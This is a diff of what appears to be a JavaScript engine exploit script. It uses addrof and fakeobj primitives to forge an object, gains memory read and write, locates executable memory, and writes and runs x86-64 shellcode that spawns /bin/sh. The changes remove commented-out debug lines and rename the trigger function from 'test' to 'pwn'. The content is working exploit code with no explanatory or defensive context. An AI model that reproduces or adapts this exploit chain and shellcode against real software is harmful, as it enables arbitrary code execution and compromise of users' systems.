@@ -91,11 +91,6 @@ victim = {
 victim_addr = f2i(addrof(victim));
 hax = fakeobj(i2f(victim_addr+0x10));
 
-//hax[1] = 5.2900040263529e-310;
-//hax[1] = i2f(f2i(addrof(hax))+0x10)
-//print(controller.a)
-
-
 var unboxed = [2.2];
 unboxed[0] = 3.3;
 var boxed = [{}];
@@ -165,7 +160,7 @@ var stage2 = {
             this.write64(target_addr+i, shellcode[i].charCodeAt());
         }
     },
-    test : function(){
+    pwn : function(){
         shellcodeObj = this.getRWXMem();
         print(hex(shellcodeObj[1]));
         shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xd2\x48\x31\xc0\xb0\x02\x48\xc1\xc8\x28\xb0\x3b\x0f\x05";
@@ -175,4 +170,4 @@ var stage2 = {
     },
 };
 
-stage2.test();
+stage2.pwn();
